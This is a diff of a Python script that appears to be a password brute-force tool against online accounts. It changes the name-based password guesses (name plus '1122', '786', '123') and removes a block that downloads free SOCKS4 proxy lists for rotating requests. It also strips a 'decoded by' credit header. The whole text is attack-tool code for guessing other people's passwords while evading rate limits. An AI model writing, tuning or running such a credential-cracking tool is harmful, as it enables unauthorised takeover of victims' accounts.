@@ -1,7 +1,3 @@
-#DECODED BY : MUMIT ISLAM HIMU
-#GITHUB : https://github.com/MUMIT-404-CYBER
-#--------------------------------------------------------------------------#
-#
 #-----------------[ IMPORT-MODULE ]-------------------
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -75,8 +71,6 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try: 
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox) 
 except Exception as e:
 	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')
 prox=open('.prox.txt','r').read().splitlines()
@@ -395,9 +389,9 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'2020')
-					pwv.append(frs+'2021')
-					pwv.append(frs+'2022')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
+					pwv.append(frs+'123')
 					pwv.append(frs+'@@')
 			else:
 				if len(frs)<3:
@@ -409,9 +403,9 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'2020')
-					pwv.append(frs+'2021')
-					pwv.append(frs+'2022')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
+					pwv.append(frs+'123')
 					pwv.append(frs+'#@')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
